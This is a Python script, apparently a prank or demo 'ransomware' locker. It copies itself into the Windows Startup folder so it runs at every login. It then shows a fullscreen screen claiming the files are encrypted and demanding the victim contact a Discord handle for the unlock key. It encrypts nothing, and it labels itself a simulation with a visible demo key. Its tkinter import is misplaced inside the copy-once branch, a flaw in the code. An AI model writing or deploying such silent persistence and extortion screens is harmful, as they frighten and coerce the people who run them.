import os
import shutil

startup = os.path.join(
    os.getenv('APPDATA'),
    r"Microsoft\Windows\Start Menu\Programs\Startup"
)

script = os.path.abspath(__file__)
destination = os.path.join(startup, "background.pyw")

if not os.path.exists(destination):
    shutil.copy(script, destination)
    import tkinter as tk

KEY = "2312345"

def check_key():
    if entry.get() == KEY:
        label.config(text="System Unlocked (Simulation)", fg="green")
        root.after(1500, root.destroy)
    else:
        label.config(text="Wrong key. Try again.", fg="red")

root = tk.Tk()
root.title("Ransomware")
root.attributes("-fullscreen", True)
root.configure(bg="black")

frame = tk.Frame(root, bg="black")
frame.pack(expand=True)

title = tk.Label(
    frame,
    text="⚠ YOUR FILES ARE ENCRYPTED ⚠\nDM ME ON DISCORD: BABA099038 FOR KEY",
    fg="red",
    bg="black",
    font=("Arial", 40, "bold")
)
title.pack(pady=30)

label = tk.Label(
    frame,
    text="Enter the unlock key:",
    fg="white",
    bg="black",
    font=("Arial", 20)
)
label.pack(pady=20)

entry = tk.Entry(frame, font=("Arial", 20), justify="center")
entry.pack(pady=10)

button = tk.Button(
    frame,
    text="Unlock",
    font=("Arial", 20),
    command=check_key
)
button.pack(pady=20)

info = tk.Label(
    frame,
    text=f"Demo key: {KEY}",
    fg="gray",
    bg="black",
    font=("Arial", 14)
)
info.pack(pady=10)

root.mainloop()